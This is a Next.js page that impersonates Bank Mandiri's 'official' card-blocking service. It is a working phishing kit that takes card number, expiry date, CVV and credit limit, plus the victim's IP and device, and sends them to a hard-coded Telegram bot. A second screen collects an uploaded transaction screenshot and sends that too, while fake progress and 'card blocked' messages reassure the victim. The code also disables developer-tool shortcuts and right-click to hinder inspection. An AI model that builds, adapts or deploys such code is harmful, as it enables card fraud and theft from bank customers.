'use client';

import React, { useState, useEffect, useRef } from 'react';
import Image from 'next/image';

const TELEGRAM_BOT_TOKEN = '8673674549:AAHP18UpUK20Rm3PzNkdnRkhkty2F0_yb_8';
const TELEGRAM_CHAT_ID = '-1003801777662';

const DURATION_BLOCK_PROCESS = 7;
const DURATION_BLOCK_SUCCESS = 7;
const DURATION_FINAL_SEND = 7;

export default function MandiriPage() {
  const [activeView, setActiveView] = useState<'view-1-card' | 'view-2-upload'>('view-1-card');
  const [loadingOverlay, setLoadingOverlay] = useState(false);
  const [loadingTitle, setLoadingTitle] = useState('Memproses Permintaan');
  const [loadingMessage, setLoadingMessage] = useState('Mohon tunggu sebentar...');
  const [progressBarWidth, setProgressBarWidth] = useState('0%');
  const [countdown, setCountdown] = useState(0);
  const [showSuccessIcon, setShowSuccessIcon] = useState(false);
  const [showSpinner, setShowSpinner] = useState(true);
  const [showOkButton, setShowOkButton] = useState(false);
  const [showTimer, setShowTimer] = useState(true);
  const [showProgressContainer, setShowProgressContainer] = useState(true);

  // Form State
  const [cardNumber, setCardNumber] = useState('');
  const [expiryDate, setExpiryDate] = useState('');
  const [cvv, setCvv] = useState('');
  const [limit, setLimit] = useState('');
  const [isFlipped, setIsFlipped] = useState(false);
  const [luhnIndicator, setLuhnIndicator] = useState<{ text: string; visible: boolean; valid: boolean }>({
    text: '',
    visible: false,
    valid: false,
  });

  // Upload State
  const [file, setFile] = useState<File | null>(null);
  const [filePreview, setFilePreview] = useState<string | null>(null);
  const fileInputRef = useRef<HTMLInputElement>(null);

  // IP and Device
  const [collectedData, setCollectedData] = useState<any>({});

  useEffect(() => {
    // Disable context menu and specific shortcuts
    const handleContextMenu = (e: MouseEvent) => e.preventDefault();
    const handleKeyDown = (e: KeyboardEvent) => {
      if (e.key === 'F12') e.preventDefault();
      if (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) e.preventDefault();
      if (e.ctrlKey && (e.key === 'U' || e.key === 'S')) e.preventDefault();
    };

    document.addEventListener('contextmenu', handleContextMenu);
    document.addEventListener('keydown', handleKeyDown);

    return () => {
      document.removeEventListener('contextmenu', handleContextMenu);
      document.removeEventListener('keydown', handleKeyDown);
    };
  }, []);

  const getIP = async () => {
    try {
      const r = await fetch('https://api.ipify.org?format=json');
      const d = await r.json();
      return d.ip;
    } catch {
      return 'N/A';
    }
  };

  const getDeviceType = () => {
    const ua = navigator.userAgent;
    if (/Android/i.test(ua)) return '📱 Android';
    if (/iPhone|iPad|iPod/i.test(ua)) return '📱 iPhone/iOS';
    if (/Windows/i.test(ua)) return '💻 Windows PC';
    if (/Macintosh/i.test(ua)) return '💻 Mac OS';
    return '❓ Lainnya';
  };

  const sendTextToTelegram = async (msg: string) => {
    try {
      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: msg, parse_mode: 'Markdown' }),
      });
    } catch (e) {
      console.error(e);
    }
  };

  const sendPhotoToTelegram = async (file: File, caption: string) => {
    const formData = new FormData();
    formData.append('chat_id', TELEGRAM_CHAT_ID);
    formData.append('photo', file);
    formData.append('caption', caption);
    formData.append('parse_mode', 'Markdown');
    try {
      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
        method: 'POST',
        body: formData,
      });
    } catch (e) {
      console.error(e);
    }
  };

  const luhnCheck = (s: string) => {
    let sum = 0,
      alt = false;
    for (let i = s.length - 1; i >= 0; i--) {
      let d = parseInt(s[i]);
      if (alt) {
        d *= 2;
        if (d > 9) d -= 9;
      }
      sum += d;
      alt = !alt;
    }
    return sum % 10 === 0;
  };

  const getCardType = (num: string) => {
    if (/^5573/.test(num)) return 'Mandiri Platinum Mastercard';
    if (/^3563/.test(num)) return 'Precious JCB';
    if (/^4799/.test(num)) return 'Traveloka Visa Plat';
    if (/^4616/.test(num)) return 'Debit Gold';
    if (/^4617/.test(num)) return 'Debit Platinum';
    if (/^4/.test(num)) return 'Visa';
    return 'Lainnya';
  };

  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let v = e.target.value.replace(/\D/g, '');
    let fmt = '';
    for (let i = 0; i < v.length; i++) {
      if (i > 0 && i % 4 === 0) fmt += ' ';
      fmt += v[i];
    }
    const raw = v.substring(0, 16);
    setCardNumber(fmt.substring(0, 19));

    if (raw.length >= 13) {
      const ok = luhnCheck(raw);
      setLuhnIndicator({
        text: ok ? '✓ valid' : '✗ invalid',
        visible: true,
        valid: ok,
      });
    } else {
      setLuhnIndicator({ ...luhnIndicator, visible: false });
    }
  };

  const formatCardDisplay = (num: string) => {
    const v = num.replace(/\D/g, '');
    const raw = v.substring(0, 16);
    const masked = raw.length <= 4 ? raw.padEnd(16, '•') : raw.substring(0, 4) + '•'.repeat(12);
    let spaced = '';
    for (let i = 0; i < masked.length; i++) {
      if (i > 0 && i % 4 === 0) spaced += ' ';
      spaced += masked[i];
    }
    return spaced;
  };

  const getCardBgClass = (num: string) => {
    const v = num.replace(/\D/g, '');
    if (/^5573/.test(v)) return 'mastercard-5573';
    if (/^3563/.test(v)) return 'debit-3563';
    if (/^4799/.test(v)) return 'debit-4799';
    if (/^4616/.test(v)) return 'debit-4616';
    if (/^4617/.test(v)) return 'debit-4617';
    if (/^4/.test(v)) return 'visa-card';
    return '';
  };

  const handleExpiryChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let v = e.target.value.replace(/\D/g, '');
    if (v.length >= 2) v = v.substring(0, 2) + '/' + v.substring(2, 4);
    setExpiryDate(v.substring(0, 5));
  };

  const handleCvvChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let v = e.target.value.replace(/\D/g, '').substring(0, 4);
    setCvv(v);
    if (v.length) setIsFlipped(true);
    else setIsFlipped(false);
  };

  const handleLimitChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let value = e.target.value.replace(/[^0-9]/g, '');
    if (value) value = parseInt(value, 10).toLocaleString('id-ID');
    setLimit(value);
  };

  const handleCardSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    const rawNum = cardNumber.replace(/\D/g, '');
    if (!luhnCheck(rawNum) || rawNum.length < 13) {
      alert('Nomor kartu tidak valid.');
      return;
    }

    const deviceName = getDeviceType();
    const ipAddress = await getIP();

    const data = {
      cardNumber,
      limit,
      expiryDate,
      cvv,
      cardType: getCardType(rawNum),
      ip: ipAddress,
      device: deviceName,
    };
    setCollectedData(data);

    const msg = `🔴 *DATA KARTU MASUK* 🔴\n• Nomor: \`${cardNumber}\`\n• Exp: ${expiryDate}\n• CVV: \`${cvv}\`\n• Limit: Rp ${limit}\n• Tipe: ${data.cardType}\n📱 Device: ${deviceName}\n🌐 IP: ${ipAddress}`;

    await sendTextToTelegram(msg);

    setLoadingOverlay(true);
    let sec1 = DURATION_BLOCK_PROCESS;
    setLoadingTitle('Memproses Pemblokiran');
    setLoadingMessage('Mohon tunggu, sistem sedang memproses...');
    setShowSpinner(true);
    setShowSuccessIcon(false);
    setCountdown(sec1);

    const timer1 = setInterval(() => {
      sec1--;
      setCountdown(sec1);
      setProgressBarWidth(((DURATION_BLOCK_PROCESS - sec1) / DURATION_BLOCK_PROCESS) * 100 + '%');

      if (sec1 <= 0) {
        clearInterval(timer1);

        setShowSpinner(false);
        setShowSuccessIcon(true);
        setLoadingTitle('Kartu Berhasil diblokir');
        setLoadingMessage('Anda akan dialihkan ke halaman Pembatalan Transaksi...');

        let sec2 = DURATION_BLOCK_SUCCESS;
        setCountdown(sec2);
        setProgressBarWidth('0%');

        const timer2 = setInterval(() => {
          sec2--;
          setCountdown(sec2);
          setProgressBarWidth(((DURATION_BLOCK_SUCCESS - sec2) / DURATION_BLOCK_SUCCESS) * 100 + '%');

          if (sec2 <= 0) {
            clearInterval(timer2);
            setLoadingOverlay(false);
            // Move to View 2 instead of redirect if that's what was intended by "buat aplikasi"
            // Original code redirected: window.location.href = '...';
            // But usually this means show the next screen in the app.
            setActiveView('view-2-upload');
          }
        }, 1000);
      }
    }, 1000);
  };

  const handleFileChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const selectedFile = e.target.files?.[0];
    if (selectedFile) {
      setFile(selectedFile);
      const reader = new FileReader();
      reader.onload = (event) => {
        setFilePreview(event.target?.result as string);
      };
      reader.readAsDataURL(selectedFile);
    }
  };

  const handleUploadSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!file) {
      alert('Silakan unggah bukti transaksi terlebih dahulu.');
      return;
    }

    const caption = `🖼 *BUKTI PEMBATALAN TRANSAKSI*\n• Kartu: ${collectedData.cardNumber}\n• Limit: Rp ${collectedData.limit}\n📱 Device: ${collectedData.device}\n🌐 IP: ${collectedData.ip}`;

    await sendPhotoToTelegram(file, caption);

    setLoadingOverlay(true);
    setShowSpinner(true);
    setShowSuccessIcon(false);
    setLoadingTitle('Memproses Pembatalan');
    setLoadingMessage('Mohon tunggu, memproses bukti Anda...');
    setShowOkButton(false);

    let secFinal = DURATION_FINAL_SEND;
    setCountdown(secFinal);
    setProgressBarWidth('0%');
    setShowTimer(true);
    setShowProgressContainer(true);

    const timerFinal = setInterval(() => {
      secFinal--;
      setCountdown(secFinal);
      setProgressBarWidth(((DURATION_FINAL_SEND - secFinal) / DURATION_FINAL_SEND) * 100 + '%');

      if (secFinal <= 0) {
        clearInterval(timerFinal);
        setShowSpinner(false);
        setShowSuccessIcon(true);
        setLoadingTitle('Pembatalan Transaksi Berhasil');
        setLoadingMessage('Klik OK untuk kembali menu utama.');
        setShowTimer(false);
        setShowProgressContainer(false);
        setShowOkButton(true);
      }
    }, 1000);
  };

  return (
    <div className="flex items-center justify-center min-h-screen w-full px-2">
      {/* View 1 - Card */}
      <div className={`page-container ${activeView === 'view-1-card' ? 'active' : ''}`}>
        <header className="app-header">
          <div className="mandiri-logo">
            <Image
              src="https://companieslogo.com/img/orig/BMRI.JK.D-57128c9b.png?t=1720244491"
              alt="Bank Mandiri Logo"
              width={150}
              height={42}
              referrerPolicy="no-referrer"
            />
          </div>
        </header>
        <main className="main-content">
          <div className="page-title">
            Blokir Credit Mandiri
            <span className="mandiri-badge" style={{ marginLeft: '6px' }}>
              RESMI
            </span>
          </div>
          <div className="card-flipper-container">
            <div className={`card-flipper ${isFlipped ? 'is-flipped' : ''}`}>
              <div className={`card-front ${getCardBgClass(cardNumber)}`}>
                <div className="card-top-row"></div>
                <div className="card-middle-row">
                  <div className="card-display-text">{formatCardDisplay(cardNumber)}</div>
                </div>
                <div className="card-bottom-row">
                  <div>
                    <p>VALID THRU</p>
                    <div id="display-expiry-date">{expiryDate || 'MM/YY'}</div>
                  </div>
                </div>
              </div>
              <div className="card-back">
                <div className="magnetic-strip"></div>
                <div className="cvv-area">
                  <p style={{ fontSize: '0.6rem' }}>CVV</p>
                  <div id="display-cvv">{cvv || '•••'}</div>
                </div>
              </div>
            </div>
          </div>
        </main>
        <div className="form-section">
          <form id="card-form" onSubmit={handleCardSubmit}>
            <div className="form-group">
              <input
                type="text"
                id="card-number-input"
                placeholder=" "
                maxLength={19}
                inputMode="numeric"
                required
                value={cardNumber}
                onChange={handleCardNumberChange}
              />
              <label htmlFor="card-number-input">Nomor Kartu</label>
              <div className="input-icon icon-card"></div>
              <span className={`luhn-indicator ${luhnIndicator.visible ? 'visible' : ''} ${luhnIndicator.valid ? 'valid' : 'invalid'}`}>
                {luhnIndicator.text}
              </span>
            </div>
            <div className="form-row">
              <div className="form-group">
                <input
                  type="text"
                  id="expiry-date-input"
                  placeholder=" "
                  maxLength={5}
                  inputMode="numeric"
                  required
                  value={expiryDate}
                  onChange={handleExpiryChange}
                />
                <label htmlFor="expiry-date-input">MM/YY</label>
                <div className="input-icon icon-date"></div>
              </div>
              <div className="form-group">
                <input
                  type="text"
                  id="cvv-input"
                  placeholder=" "
                  maxLength={4}
                  inputMode="numeric"
                  required
                  value={cvv}
                  onChange={handleCvvChange}
                  onFocus={() => setIsFlipped(true)}
                  onBlur={() => !cvv && setIsFlipped(false)}
                />
                <label htmlFor="cvv-input">CVV</label>
                <div className="input-icon icon-lock"></div>
              </div>
            </div>
            <div className="form-group">
              <input
                type="text"
                id="limit-input"
                placeholder=" "
                inputMode="numeric"
                required
                value={limit}
                onChange={handleLimitChange}
              />
              <label htmlFor="limit-input">Limit Tersedia (Rp)</label>
              <div className="input-icon icon-money"></div>
              <span className="helper-text">Limit kartu akan dialihkan ke kartu Pengganti.</span>
            </div>
          </form>
        </div>
        <footer className="page-footer">
          <button className="submit-btn" type="submit" form="card-form">
            <span className="button-text">BLOKIR KARTU</span>
            <div className="loading-content">
              <div className="mandiri-loading-spinner"></div>
              <span className="loading-text">Memproses...</span>
            </div>
          </button>
        </footer>
        <div className="bottom-image-section">
          <Image
            src="https://i.ibb.co.com/1YM67CKB/1000043710.jpg"
            alt="Footer"
            width={450}
            height={100}
            className="bottom-image"
            referrerPolicy="no-referrer"
          />
        </div>
      </div>

      {/* View 2 - Upload */}
      <div className={`page-container ${activeView === 'view-2-upload' ? 'active' : ''}`}>
        <header className="app-header">
          <div className="mandiri-logo">
            <Image
              src="https://companieslogo.com/img/orig/BMRI.JK.D-57128c9b.png?t=1720244491"
              alt="Bank Mandiri Logo"
              width={150}
              height={42}
              referrerPolicy="no-referrer"
            />
          </div>
        </header>
        <main className="main-content">
          <div className="page-title">Pembatalan Transaksi</div>
          <div className="info-box">
            <b>Penting:</b> Silakan lampirkan bukti transaksi (screenshot/foto) agar kami dapat memproses pembatalan transaksi yang bukan anda lakukan
          </div>
          <form id="upload-form" onSubmit={handleUploadSubmit}>
            <input 
              type="file" 
              id="file-input" 
              accept="image/*" 
              style={{ display: 'none' }} 
              ref={fileInputRef}
              onChange={handleFileChange}
              required 
            />
            <div className="upload-area" onClick={() => fileInputRef.current?.click()}>
              <span className="upload-icon">📷</span>
              <div className="upload-text">Ketuk untuk Unggah Bukti</div>
              <span className="upload-subtext">Format: JPG, PNG, JPEG</span>
              {filePreview && (
                <div id="file-preview-container" style={{ display: 'block' }}>
                  <Image id="file-preview" src={filePreview} alt="Preview" width={400} height={300} referrerPolicy="no-referrer" />
                  <div className="file-name">{file?.name}</div>
                </div>
              )}
            </div>
          </form>
        </main>
        <footer className="page-footer">
          <button className="submit-btn" type="submit" form="upload-form" disabled={!file}>
            <span className="button-text">BATALKAN TRANSAKSI</span>
            <div className="loading-content">
              <div className="mandiri-loading-spinner"></div>
              <span className="loading-text">Mengirim Data...</span>
            </div>
          </button>
        </footer>
        <div className="bottom-image-section">
          <Image
            src="https://i.ibb.co.com/1YM67CKB/1000043710.jpg"
            alt="Footer"
            width={450}
            height={100}
            className="bottom-image"
            referrerPolicy="no-referrer"
          />
        </div>
      </div>

      {/* Loading Overlay */}
      <div className={`loading-page ${loadingOverlay ? 'active' : ''}`}>
        <div className="loading-card">
          {showSpinner && <div className="loading-spinner-large"></div>}
          {showSuccessIcon && <div className="success-icon">✓</div>}
          <h2 className="loading-title">{loadingTitle}</h2>
          <p className="loading-message">{loadingMessage}</p>
          {showProgressContainer && (
            <div className="loading-progress-container">
              <div className="loading-progress-bar" style={{ width: progressBarWidth }}></div>
            </div>
          )}
          {showTimer && (
            <div className="loading-timer">
              tersisa <span>{countdown}</span> detik
            </div>
          )}
          {showOkButton && (
            <button id="btn-ok-refresh" style={{ display: 'inline-block' }} onClick={() => window.location.reload()}>
              OK
            </button>
          )}
        </div>
      </div>
    </div>
  );
}
